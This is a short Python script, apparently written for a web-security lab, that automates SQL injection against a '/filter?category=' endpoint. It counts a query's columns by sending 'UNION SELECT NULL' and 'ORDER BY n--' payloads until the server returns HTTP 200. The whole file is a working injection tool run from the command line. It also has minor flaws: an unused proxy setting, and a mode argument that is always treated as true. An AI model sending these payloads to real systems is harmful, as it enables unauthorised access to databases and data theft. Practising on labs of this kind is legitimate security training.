import sys

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def exploit_sqli(way, url):
    uri = "/filter?category=asdf' "
    count = 1
    if way:
        for i in range(1, 50):
            if i == 49:
                return (False, -1)
            r = requests.get(
                url + uri + "UNION SELECT NULL" + ", NULL" * (i - 1) + "--"
            )
            print(url + uri + "UNION SELECT NULL" + ", NULL" * (i - 1) + "--")
            print(r.status_code)
            if r.status_code == 200:
                return (True, count)
            count += 1

    else:
        for i in range(1, 50):
            if i == 49:
                return (False, -1)
            r = requests.get(url + uri + f"ORDER BY {i}--")
            if r.status_code == 200:
                return (True, count)
            count += 1


if __name__ == "__main__":
    try:
        way = sys.argv[1].strip()
        url = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <way> <url>" % sys.argv[0])
        print('[-] Example: %s 0 www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)

    success, count = exploit_sqli(way, url)

    if success:
        print(f"[+] SQL injection successful and count is {count}")
    else:
        print("[-] SQL injection unsuccessful!")
